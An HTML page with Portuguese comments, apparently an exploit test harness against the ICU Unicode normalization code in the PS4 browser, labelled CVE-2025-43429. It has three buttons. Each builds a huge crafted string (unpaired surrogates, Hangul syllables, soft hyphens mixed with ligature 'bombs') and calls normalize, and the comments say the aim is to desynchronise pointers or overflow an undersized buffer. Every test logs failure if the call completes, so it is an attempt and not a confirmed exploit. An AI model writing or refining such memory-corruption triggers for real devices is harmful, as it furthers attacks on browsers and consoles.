<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 ICU CVE-2025-43429 (Logic Break)</title>
    <style>
        body { font-family: 'Courier New', monospace; padding: 20px; background-color: #050505; color: #0f0; }
        h1 { color: #fff; border-bottom: 2px solid #333; padding-bottom: 10px; }
        .controls { margin-bottom: 20px; background: #1a1a1a; padding: 15px; border-radius: 8px; border: 1px solid #333; }
        button { 
            display: block; width: 100%; margin: 10px 0; padding: 15px; 
            font-size: 16px; font-weight: bold; cursor: pointer; 
            background-color: #222; color: #ddd; border: 1px solid #444; 
        }
        button:hover { background-color: #444; color: #fff; }
        button.danger { background-color: #500; border-color: #a00; }
        button.danger:hover { background-color: #800; }
        #log { 
            height: 400px; border: 1px solid #0a0; overflow-y: scroll; 
            padding: 10px; background: #000; font-size: 14px; white-space: pre-wrap; 
        }
        .error { color: #ff5555; }
        .highlight { color: #ffff55; }
    </style>
</head>
<body>
    <h1>CVE-2025-43429: ICU Logic Break</h1>
    
    <div class="controls">
        <p>Status: Força bruta falhou (OOM/Proteção). Tentando corrupção lógica com input pequeno.</p>
        <button class="danger" onclick="test218m_Surrogates()">Test 218m: Surrogates Desemparelhados (Invalid UTF-16)</button>
        <button class="danger" onclick="test218n_HangulAlgo()">Test 218n: Hangul Algorítmico (Decomposição Matemática)</button>
        <button class="danger" onclick="test218o_Accordion()">Test 218o: Ataque Sanfona (Ignoráveis + Bomba)</button>
        <hr style="border-color: #333;">
        <button onclick="clearLog()">Limpar Log</button>
    </div>

    <div id="log">=== PRONTO ===</div>

    <script>
        const log = document.getElementById('log');

        function addLog(msg, type = 'normal') {
            const div = document.createElement('div');
            const time = new Date().toLocaleTimeString();
            div.textContent = `[${time}] ${msg}`;
            if (type === 'error') div.className = 'error';
            if (type === 'highlight') div.className = 'highlight';
            log.appendChild(div);
            log.scrollTop = log.scrollHeight;
        }

        function clearLog() { log.innerHTML = '=== LOG LIMPO ==='; }
        
        function forceGC() { try { if (window.gc) window.gc(); } catch(e) {} }

        // =================================================================
        // TESTE 218m: Surrogates Desemparelhados
        // Input pequeno (~50MB). Foco: Confundir o iterador de string.
        // \uD800 é um "High Surrogate" sem par. O ICU pode contar errado o tamanho.
        // =================================================================
        function test218m_Surrogates() {
            addLog('>>> INICIANDO TESTE 218m (Surrogates) <<<', 'highlight');
            try {
                forceGC();
                
                // Padrão tóxico: Surrogate isolado + Caractere de expansão
                let toxicPair = "\uD800" + "\uFB03"; 
                
                // Tamanho moderado (50MB) para não dar OOM
                let count = 1024 * 1024 * 25; 
                
                addLog(`1. Criando string tóxica (~${count * 4 / 1024 / 1024} MB)...`);
                let s = toxicPair.repeat(count / 2);
                
                addLog('2. Disparando normalize... (Tentando desalinhar ponteiros)');
                let res = s.normalize('NFKC');
                
                addLog('Falha: Navegador tratou os surrogates corretamente.', 'error');
            } catch(e) {
                addLog('ERRO: ' + e.message, 'error');
            }
        }

        // =================================================================
        // TESTE 218n: Hangul Algorítmico
        // Input: ~100MB. Foco: Estouro no algoritmo de decomposição Jamo.
        // Ao contrário de tabelas fixas, isso usa matemática (divisão/módulo).
        // =================================================================
        function test218n_HangulAlgo() {
            addLog('>>> INICIANDO TESTE 218n (Hangul) <<<', 'highlight');
            try {
                forceGC();
                
                // \uAC00 é a primeira sílaba Hangul (Ga). Expande para 2 ou 3 Jamos.
                let hangul = "\uAC00"; 
                
                // 80MB Input -> ~240MB Output (Seguro para RAM, perigoso para CPU/Lógica)
                let count = 1024 * 1024 * 40; 
                
                addLog(`1. Criando bloco Hangul (~${count * 2 / 1024 / 1024} MB)...`);
                let s = hangul.repeat(count);
                
                addLog('2. Disparando NFD (Decomposição Algorítmica)...');
                // NFD força o cálculo matemático de decomposição
                let res = s.normalize('NFD');
                
                addLog('3. Disparando NFKC no resultado (Recomposição)...');
                let res2 = res.normalize('NFKC');
                
                addLog('Falha: Algoritmo executou perfeitamente.', 'error');
            } catch(e) {
                addLog('ERRO: ' + e.message, 'error');
            }
        }

        // =================================================================
        // TESTE 218o: Ataque Sanfona (Shrink & Explode)
        // Input: ~100MB. Foco: Enganar o pre-flight de tamanho.
        // Muitos caracteres ignoráveis (\u00AD Soft Hyphen) fazem o ICU achar
        // que o output será PEQUENO. A bomba no final estoura o buffer subdimensionado.
        // =================================================================
        function test218o_Accordion() {
            addLog('>>> INICIANDO TESTE 218o (Sanfona) <<<', 'highlight');
            try {
                forceGC();
                
                // 90% da string são caracteres que SOMEM na normalização NFKC (format controls)
                let ghost = "\u00AD".repeat(100); 
                // 10% é pura expansão (ffi ligature)
                let bomb = "\uFB03".repeat(10);
                
                let block = ghost + bomb;
                let count = 1024 * 1024; // 1 milhão de blocos
                
                addLog(`1. Criando Sanfona (~${(count * block.length * 2) / 1024 / 1024} MB)...`);
                let s = block.repeat(count);
                
                addLog('2. Disparando normalize (Esperando under-allocation)...', 'highlight');
                // O navegador pode alocar espaço apenas para a parte "bomba", ignorando os ghosts,
                // mas se errar o cálculo do ponteiro de escrita, BOOM.
                let res = s.normalize('NFKC');
                
                addLog('Falha: Cálculo de tamanho foi preciso.', 'error');
            } catch(e) {
                addLog('ERRO: ' + e.message, 'error');
            }
        }
    </script>
</body>
</html>
